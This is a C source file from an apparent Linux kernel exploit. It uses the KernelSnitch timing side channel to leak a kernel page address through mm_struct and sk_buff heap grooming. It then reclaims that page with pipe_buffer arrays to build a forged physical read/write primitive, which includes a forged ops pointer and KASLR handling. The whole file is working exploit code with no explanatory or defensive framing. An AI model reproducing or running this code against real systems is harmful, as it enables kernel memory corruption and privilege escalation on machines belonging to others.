/* pipe_reclaim.c — KernelSnitch pipe_buffer-array page reclaim, extracted
 * from pipe.c; pipe_physrw.c supplies make/alloc/free_pipe_object and
 * direct_to_page. Used by the rwforge channel (no configfs needed). */
#include "common.h"

#define PIPE_SHAPE_ROUNDS 0

static int pipe_objects_ready;
int pipe_fds_n[PIPE_N_COUNT][2];
int pipe_fds_c[PIPE_C_COUNT][2];
int pipe_fds_e[PIPE_E_COUNT][2];
int pipe_fds_drain[PIPE_DRAIN][2];
int pipe_fds_reclaim[PIPE_RECLAIM][2];
int pipe_drain_cnt = PIPE_DRAIN;
int pipe_reclaim_cnt = PIPE_RECLAIM;
extern pid_t pipe_prepare_child;  /* owned by pipe_physrw.c */

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN_RT; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM_RT; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < PIPE_DRAIN_RT; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM_RT; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
    /* A17: move reclaim fds high (>=4096) — the route rounds dup2-clobber
     * fds 0..448 in this process, and with reduced pipe counts the default
     * reclaim fds land right in that range (scan tee EINVAL). */
    for (int e = 0; e < 2; e++) {
      int hi = fcntl(pipe_fds_reclaim[i][e], F_DUPFD_CLOEXEC,
                     4096 + (int)i * 2 + e);
      if (hi >= 0) {
        close(pipe_fds_reclaim[i][e]);
        pipe_fds_reclaim[i][e] = hi;
      } else if (i == 0 && e == 0) {
        pr_warning("rwf fdmove failed: errno=%d\n", errno);
      }
      if (i == 0 && e == 0)
        pr_info("rwf fdmove pipe0: %d -> %d\n", pipe_fds_reclaim[i][e], hi);
    }
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  return base;
}


/* rwforge integration helpers */
int pipe_read_full(int fd, void *buf, size_t len) {
  size_t done = 0;
  while (done < len) {
    ssize_t r = read(fd, (char *)buf + done, len - done);
    if (r <= 0) return 0;
    done += (size_t)r;
  }
  return 1;
}

int pipe_write_full(int fd, const void *buf, size_t len) {
  size_t done = 0;
  while (done < len) {
    ssize_t r = write(fd, (const char *)buf + done, len - done);
    if (r <= 0) return 0;
    done += (size_t)r;
  }
  return 1;
}

uintptr_t pipe_buf_ops_addr(void) {
  /* must be the slide-free p0 alias (physmap alias of the image), not
   * text_addr: run_rwforge runs with kaslr_slide=0, so text_addr is wrong
   * on KASLR kernels; the kernel dereferences ops on every forged-slot
   * read/write. */
  return data_addr(ANON_PIPE_BUF_OPS);
}

int pipe_reclaim_read_fd(size_t i) { return pipe_fds_reclaim[i][0]; }
int pipe_reclaim_write_fd(size_t i) { return pipe_fds_reclaim[i][1]; }
